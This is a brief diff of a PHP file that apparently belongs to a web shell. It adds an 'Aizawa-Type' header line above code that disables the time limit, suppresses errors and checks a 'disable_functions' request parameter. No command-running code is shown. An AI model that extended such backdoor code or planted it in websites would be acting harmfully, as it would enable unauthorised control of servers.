@@ -1,4 +1,5 @@
 <?php 
+header('Aizawa-Type: http_user_agent_get');
 set_time_limit(0);
 error_reporting(0);
 if (isset($_GET['disable_functions'])) {
